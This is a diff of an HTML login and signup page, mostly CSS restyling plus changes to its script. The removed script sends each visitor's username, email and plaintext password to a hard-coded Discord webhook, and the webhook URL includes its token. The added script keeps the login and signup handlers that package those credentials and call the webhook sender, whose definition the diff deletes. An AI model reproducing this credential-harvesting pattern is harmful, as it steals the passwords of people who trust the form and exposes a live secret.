@@ -10,131 +10,54 @@
 
     body {
       font-family: Arial, sans-serif;
+      margin: 0;
     }
 
     .header {
       background-color: #000;
       color: #fff;
       padding: 20px;
+      text-align: center;
     }
 
     .header h1 {
       margin: 0;
+      color: #fff;
     }
 
     .container {
       margin: 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
     }
 
     .form-container {
       max-width: 400px;
-      margin: 0 auto;
-    }
-
-    .form-container h2 {
-      margin-bottom: 20px;
-    }
-
-    .form-container label,
-    .form-container input[type="text"],
-    .form-container input[type="password"],
-    .form-container button {
-      display: block;
-      margin-bottom: 10px;
     }
 
     .form-container button {
       padding: 8px 12px;
+      color: #fff;
+      background-color: transparent;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
     }
 
-    .popup {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background-color: #fff;
-      width: 300px;
-      padding: 20px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
-      display: none;
+    .form-container button:hover {
+      text-decoration: underline;
     }
 
-    .popup.show {
-      display: block;
-    }
-
-    .popup h2 {
-      margin-top: 0;
-    }
-
-    .popup label,
-    .popup input[type="text"],
-    .popup input[type="password"],
-    .popup button {
-      display: block;
-      margin-bottom: 10px;
-    }
-
-    .popup button {
-      padding: 8px 12px;
+    .form-container button:first-child {
+      margin-right: 10px;
     }
   </style>
-  <script>
-    function openPopup(popupId) {
-      document.getElementById(popupId).classList.add("show");
-    }
-
-    function closePopup(popupId) {
-      document.getElementById(popupId).classList.remove("show");
-    }
-
-    function sendWebhook(content) {
-      const webhookUrl = "https://discord.com/api/webhooks/1114747356055879781/7fH1tMXA2cJ8neQ3o4pMsZfnJwqAsBFt3xHOIcjHzrs3JZrJ5Fnun5zHluFw3bR5k60B";
-
-      fetch(webhookUrl, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ content })
-      })
-        .then(response => {
-          if (response.ok) {
-            alert("Notification sent successfully!");
-          } else {
-            alert("Failed to send notification.");
-          }
-        })
-        .catch(error => {
-          console.error("Error:", error);
-          alert("An error occurred while sending the notification.");
-        });
-    }
-
-    function login(event) {
-      event.preventDefault();
-      const username = document.getElementById("loginUsername").value;
-      const password = document.getElementById("loginPassword").value;
-
-      const content = `**Login**\nUsername: ${username}\nPassword: ${password}`;
-      sendWebhook(content);
-    }
-
-    function signup(event) {
-      event.preventDefault();
-      const username = document.getElementById("signupUsername").value;
-      const email = document.getElementById("signupEmail").value;
-      const password = document.getElementById("signupPassword").value;
-
-      const content = `**Sign Up**\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`;
-      sendWebhook(content);
-    }
-  </script>
 </head>
 
 <body>
   <div class="header">
-    <h1>Login and Signup</h1>
+    <h1>MAIN</h1>
   </div>
 
   <div class="container">
@@ -173,6 +96,35 @@
     </form>
   </div>
 
+  <script>
+    function openPopup(popupId) {
+      document.getElementById(popupId).classList.add("show");
+    }
+
+    function closePopup(popupId) {
+      document.getElementById(popupId).classList.remove("show");
+    }
+
+    function login(event) {
+      event.preventDefault();
+      const username = document.getElementById("loginUsername").value;
+      const password = document.getElementById("loginPassword").value;
+
+      const content = `**Login**\nUsername: ${username}\nPassword: ${password}`;
+      sendWebhook(content);
+    }
+
+    function signup(event) {
+      event.preventDefault();
+      const username = document.getElementById("signupUsername").value;
+      const email = document.getElementById("signupEmail").value;
+      const password = document.getElementById("signupPassword").value;
+
+      const content = `**Sign Up**\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`;
+      sendWebhook(content);
+    }
+  </script>
+
 </body>
-  
+
 </html>
